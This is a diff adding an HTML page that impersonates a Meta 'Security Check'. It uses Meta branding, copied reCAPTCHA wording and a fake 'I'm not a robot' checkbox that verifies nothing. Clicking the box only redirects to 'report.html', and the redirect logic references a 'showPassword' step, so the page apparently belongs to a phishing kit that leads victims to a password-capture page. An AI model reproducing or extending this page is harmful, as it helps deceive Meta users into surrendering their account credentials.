@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta - Security Check</title>
+    <link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico">
+    <style>
+        body {
+            /* Nền web trắng */
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            /* CĂN GIỮA TOÀN BỘ NỘI DUNG */
+            justify-content: center; 
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background-color: #fff;
+            padding: 0; 
+            box-shadow: none; 
+            max-width: 480px;
+            width: 100%;
+            text-align: left; 
+            margin: 0;
+        }
+        .meta-logo {
+            margin-bottom: 5px;
+            justify-content: flex-start;
+            display: flex; 
+            align-items: center;
+        }
+        .meta-logo img {
+            height: 45px; 
+            width: auto;
+            align: left;
+        }
+        .recaptcha-box {
+            border: 1px solid #d3d3d3; /* Khung viền màu xám nhạt */
+            border-radius: 3px; /* Bo góc nhẹ */
+            padding: 5px 25px; /* Điều chỉnh padding */
+            margin: 10px 0; 
+            display: flex;
+            align-items: center;
+            justify-content: space-between; /* Căn đều các mục */
+            max-width: 300px; 
+            cursor: pointer;
+            background-color: #f9f9f9; 
+            box-shadow: 0 0 5px rgba(0,0,0,0.1); 
+        }
+        .recaptcha-box:hover {
+            border-color: #c1c1c1; 
+        }
+        .recaptcha-checkbox {
+            display: flex;
+            align-items: center;
+        }
+        .recaptcha-checkbox input[type="checkbox"] {
+            width: 28px;
+            height: 28px;
+            margin-right: 15px;
+            cursor: pointer;
+            /* TÙY CHỈNH MÀU SẮC CHECKBOX KHI ĐƯỢC TICK (Xám nhẹ nhàng) */
+            accent-color: #999999; 
+        }
+        .recaptcha-logo {
+            text-align: right; 
+            line-height: 1.2;
+            font-size: 11px;
+            color: #777;
+        }
+        .recaptcha-logo img {
+            width: 35px;
+            height: 35px;
+            margin-bottom: 3px;
+            display: block;
+            margin-left: auto; 
+        }
+        .recaptcha-text {
+            font-size: 15px;
+            color: #1c2b33;
+            text-align: left; 
+            margin-top: 25px;
+            line-height: 1.5;
+        }
+        .recaptcha-text p {
+            margin-bottom: 15px;
+        }
+        .recaptcha-text a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="meta-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/960px-Meta-Logo.png?20211104123859" alt="Meta Logo">
+        </div>
+
+        <div class="recaptcha-box" id="recaptchaBox">
+            <div class="recaptcha-checkbox">
+                <input type="checkbox" id="robotCheckbox">
+                <label for="robotCheckbox" style="cursor: pointer;">I'm not a robot</label>
+            </div>
+            <div class="recaptcha-logo">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
+                reCAPTCHA<br>
+                <a href="#" target="_blank">Privacy</a> - <a href="#" target="_blank">Terms</a>
+            </div>
+        </div>
+
+        <div class="recaptcha-text">
+            <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+            <p>We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's <a href="#" target="_blank">Privacy Policy</a> and <a href="#" target="_blank">Terms of Use</a>.</p>
+            <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
+        </div>
+    </div>
+
+    <script>
+        // Hàm chuyển hướng
+        function redirectToNextStep() {
+            const nextStep = sessionStorage.getItem('nextStep');
+            if (nextStep === 'showPassword') {
+                window.location.href = 'report.html?recaptcha=done';
+            } else {
+                window.location.href = 'report.html'; 
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const checkbox = document.getElementById('robotCheckbox');
+            const recaptchaBox = document.getElementById('recaptchaBox');
+
+            // Xử lý khi người dùng click vào box reCAPTCHA
+            recaptchaBox.addEventListener('click', (e) => {
+                if (e.target.id !== 'robotCheckbox') {
+                    checkbox.checked = !checkbox.checked;
+                }
+                
+                // CHUYỂN HƯỚNG TRÌ HOÃN 1 GIÂY (1000ms)
+                if (checkbox.checked) {
+                     setTimeout(redirectToNextStep, 1000);
+                }
+            });
+
+            // Xử lý khi người dùng click trực tiếp vào checkbox
+            checkbox.addEventListener('change', () => {
+                 // CHUYỂN HƯỚNG TRÌ HOÃN 1.5 GIÂY (1500ms)
+                 if (checkbox.checked) {
+                     setTimeout(redirectToNextStep, 1500);
+                 }
+            });
+        });
+    </script>
+</body>
+</html>
